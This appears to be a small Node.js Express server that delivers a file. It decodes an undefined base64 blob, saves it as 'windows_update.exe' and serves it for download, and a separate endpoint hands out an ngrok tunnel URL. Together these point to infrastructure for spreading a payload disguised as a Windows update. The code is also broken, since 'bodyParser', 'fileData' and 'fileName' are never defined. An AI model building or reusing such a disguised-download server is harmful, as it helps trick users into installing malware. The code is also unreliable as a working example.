const express = require('express');
const app = express();
const PORT = process.env.PORT || 4500;
const fs = require('fs');

app.use(bodyParser.json({ limit: '50mb' }))

app.all('/ok', (req, res) => {
    const date = new Date();
    const day = `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`
    const time = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`
    res.send(`OK! ${day} ${time}`)
})

app.all('/url', (req, res) => {
    res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
})

app.get('/download', function (request, response) {
    var fileContents = Buffer.from(fileData, "base64");
    var savedFilePath = '/download/windows_update.exe';
    fs.writeFile(savedFilePath, fileContents, function () {
        response.status(200).download(savedFilePath, fileName);
    });
});

app.get('/', function (req, res) {
    res.sendFile(`${__dirname}/download/index.html`);
});

app.listen(PORT)
console.log(`Servidor listen on port ${PORT}`)